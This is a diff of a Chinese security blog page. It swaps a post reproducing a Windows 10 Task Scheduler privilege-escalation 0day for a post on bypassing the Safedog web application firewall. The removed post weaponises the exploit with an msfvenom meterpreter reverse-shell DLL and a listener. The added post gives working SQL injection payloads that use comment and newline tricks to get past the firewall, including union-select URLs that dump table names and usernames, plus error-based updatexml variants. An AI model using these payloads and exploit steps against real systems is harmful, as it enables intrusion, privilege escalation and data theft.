@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>windows-提权0day-复现 | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="windows-提权0day-复现 | 九世的博客">
+  <title>Bypass安全狗注入-再见篇 | 九世的博客</title>
+  <meta name="keywords" content=" bypass ">
+  <meta name="description" content="Bypass安全狗注入-再见篇 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1151,9 +1151,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-windows-提权0day-复现" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-Bypass安全狗注入-再见篇" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">windows-提权0day-复现</h1>
+        <h1 class="article-title">Bypass安全狗注入-再见篇</h1>
     
     <div class="article-meta">
         
@@ -1162,14 +1162,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color2">bypass</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-19 20:36:16">2018-08-31 12:20</time>
+        创建时间:<time class="date" title="更新时间: 2019-11-15 00:09:19">2019-11-14 21:37</time>
         
     </div>
     <div class="article-meta">
@@ -1191,7 +1191,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言："><span class="toc-text">前言：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#正文"><span class="toc-text">正文</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#将其武器化"><span class="toc-text">将其武器化</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#开打"><span class="toc-text">开打</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1206,17 +1206,40 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><embed src="//music.163.com/style/swf/widget.swf?sid=33856586&type=2&auto=1&width=320&height=66" width="340" height="86" allownetworking="all">
+        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1372563872&auto=1&height=66"></iframe>
 
-<p>win10中任务调度服务导出的函数没有验证调用者的权限，任意权限的用户调用该函数可以获取系统敏感文件的写权限，进而提权。影响范围：windows10，windows server 2016昨天群里的基友们都复现了一遍也都成功了，也有基友在windows8实验了发现了也能提权成功。</p>
-<p><img src="https://s1.ax1x.com/2018/09/01/Pximdg.jpg" alt="Pximdg.jpg" border="0"></p>
-<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>准备工作：下载POC，windows 10 镜像，Process Explorer，CFF<br>POC：<a href="https://github.com/SandboxEscaper/randomrepo" target="_blank" rel="noopener">GitHub - SandboxEscaper/randomrepo: Repo for random stuff</a><br>windows10 ISO:msdn下载<br>Process Explorer：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer" target="_blank" rel="noopener">Process Explorer - Windows Sysinternals | Microsoft Docs</a><br>CFF:<a href="https://ntcore.com/?page_id=388" target="_blank" rel="noopener">Explorer Suite – NTCore</a></p>
-<p>首先打开一个notepad<br><img src="https://s1.ax1x.com/2018/09/01/Pxi3Q0.png" alt="Pxi3Q0.png" border="0"><br>并没有什么不同，执行<br><img src="https://s1.ax1x.com/2018/09/01/PxinoQ.md.png"><br>带有子进程conhost和notepad的cmd.exe已经生成为SYSTEM！</p>
-<h3 id="将其武器化"><a href="#将其武器化" class="headerlink" title="将其武器化"></a>将其武器化</h3><p>在kali执行 <code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f dll &gt; ka.dll</code><br><img src="https://s1.ax1x.com/2018/08/31/PvFgQP.md.png" alt=""><br>移动到windows10<br><img src="https://s1.ax1x.com/2018/09/01/PxiMJs.md.png"><br>在CFF打开<code>ALPC-TaskSched-LPE.dll</code>替换其msf生成的dll，然后保存<br><img src="https://s1.ax1x.com/2018/09/01/PxiGLT.md.png"></p>
-<p><img src="https://s1.ax1x.com/2018/09/01/PxiQWn.md.png"><br>kali中执行监听命令<br><img src="https://s1.ax1x.com/2018/09/01/PxiVL8.md.png"><br>windows 10中执行<br><img src="https://s1.ax1x.com/2018/09/01/PxiEsf.md.png"><br>返回kali可以发现已经成功的反弹了一个meterpreter，并且是system权限<br><img src="https://s1.ax1x.com/2018/09/01/Pxilzq.md.png"></p>
-<p><img src="https://s1.ax1x.com/2018/09/01/Pxi8yV.md.png"></p>
-<p><img src="https://s1.ax1x.com/2018/09/01/PxieeS.md.png"></p>
-<p>分析此0day的文章：<a href="https://www.anquanke.com/post/id/158293" target="_blank" rel="noopener">漏洞预警 | Windows 10本地提权0day预警 - 安全客，安全资讯平台</a><br>转载请注明来自：422926799.github.io</p>
+<p>很久之前弄过狗，好像没弄过。那么在来弄弄这够吧，让其从一只狗变成一只二哈。奇妙的比喻<br><img src="https://s2.ax1x.com/2019/11/14/MUQNee.png" alt="MUQNee.png"></p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.secpulse.com/archives/109577.html" target="_blank" rel="noopener">【思路/技术】某大佬的BypassWAF新思路（附脚本） - SecPulse.COM | 安全脉搏</a></p>
+<h1 id="开打"><a href="#开打" class="headerlink" title="开打"></a>开打</h1><p>安全狗的版本<br><img src="https://s2.ax1x.com/2019/11/14/MUQrSP.png" alt="MUQrSP.png"></p>
+<p>常规的绕过：</p>
+<pre><code>and 1=1和and 1=2被拦截
+Xor 1=1和Xor 1=2不拦截
+if((1=1),1,2)和if((1=2),1,2)不拦截
+</code></pre><p><img src="https://s2.ax1x.com/2019/11/14/MUQRoj.png" alt="MUQRoj.png"></p>
+<p><img src="https://s2.ax1x.com/2019/11/14/MUQ7OU.png" alt="MUQ7OU.png"></p>
+<p>order by以前使用<code>/**/OrDer/**/By/**/x</code>这样就可以过，现在不行了<br><img src="https://s2.ax1x.com/2019/11/14/MUlVfI.png" alt="MUlVfI.png"></p>
+<p>后面使用上述文章的方法，现在还是能过的<br><img src="https://s2.ax1x.com/2019/11/14/MUlrN9.png" alt="MUlrN9.png"></p>
+<pre><code>payload:/**/%23aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%0a
+</code></pre><p>上面的payload url解码后会变成<br><img src="https://s2.ax1x.com/2019/11/14/MUljHg.png" alt="MUljHg.png"><br>利用换行的方法跳过了注释</p>
+<p>尝试使用文章的方法<br><img src="https://s2.ax1x.com/2019/11/14/MUlhHe.png" alt="MUlhHe.png"></p>
+<pre><code>http://192.168.241.158/sql.php?id=0/**/union/**/%23aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%0aselect%201,user%23aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%0a() 
+</code></pre><p><img src="https://s2.ax1x.com/2019/11/14/MUlH3t.png" alt="MUlH3t.png"></p>
+<p>这里发现version这个会被拦截，<code>@@version</code>，<code>version/**/()</code>,<code>version/**/(/**/)</code>,<code>(((VeRsiOn/**/(/**/))))</code>还是不行- -，带有关键字version并且在select后面就会被k<br><img src="https://s2.ax1x.com/2019/11/14/MU1ivV.png" alt="MU1ivV.png"></p>
+<pre><code>http://192.168.241.158/sql.php?id=0/**/union/**/%23aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%0aselect%201,table_name/**/%23aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%0afrom/**/%23aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%0ainformation_schema.tables/**/%23aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%0awhere/**/%23aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%0atable_schema=%22tests%22
+</code></pre><p><img src="https://s2.ax1x.com/2019/11/14/MUYMn0.png" alt="MUYMn0.png"></p>
+<p><img src="https://s2.ax1x.com/2019/11/14/MUYc3d.png" alt="MUYc3d.png"></p>
+<p>这里开了information_schema数据库保护还是没法绕过的（默认关闭）<br><img src="https://s2.ax1x.com/2019/11/14/MUYwB6.md.png" alt="MUYwB6.md.png"></p>
+<pre><code>http://192.168.241.158/sql.php?id=0/**/union/**/%23aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%0aselect%201,username/**/%23aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%0afrom/**/users
+</code></pre><p><img src="https://s2.ax1x.com/2019/11/14/MUY2jI.png" alt="MUY2jI.png"></p>
+<p>报错注入绕过</p>
+<pre><code>updatexml() 不拦截
+updatexml(1,,1) 不拦截
+updatexml(1,concat,1) 拦截
+updatexml/**/#aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa (1,concat,1) 不拦截
+/**/and/**/updatexml/**/#aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa (1,concat(0x7e,(select/**/user/**/#aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ()),0x7e),1) 不拦截
+</code></pre><p><img src="https://s2.ax1x.com/2019/11/15/MUNXkT.png" alt="MUNXkT.png"></p>
+<p>附bypass waf脚本<br><img src="https://s2.ax1x.com/2019/11/15/MUUNcj.md.png" alt="MUUNcj.md.png"></p>
+<p><a href="https://github.com/422926799/note/tree/master/%E8%87%AA%E5%B7%B1%E5%86%99%E7%9A%84%E5%B7%A5%E5%85%B7/%E8%87%AA%E5%8A%A8%E5%8C%96bypass_waf" target="_blank" rel="noopener">note/自己写的工具/自动化bypass_waf at master · 422926799/note · GitHub</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1226,12 +1249,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>windows-提权0day-复现</p>
+    <p><span class="copy-title">文章标题:</span>Bypass安全狗注入-再见篇</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2018-08-31, 12:20:48</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-19, 20:36:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/c24b1fd3.html" title="windows-提权0day-复现">http://422926799.github.io/posts/c24b1fd3.html</a>
+    <p><span class="copy-title">发布时间:</span>2019-11-14, 21:37:56</p>
+    <p><span class="copy-title">最后更新:</span>2019-11-15, 00:09:19</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/9d8606fc.html" title="Bypass安全狗注入-再见篇">http://422926799.github.io/posts/9d8606fc.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
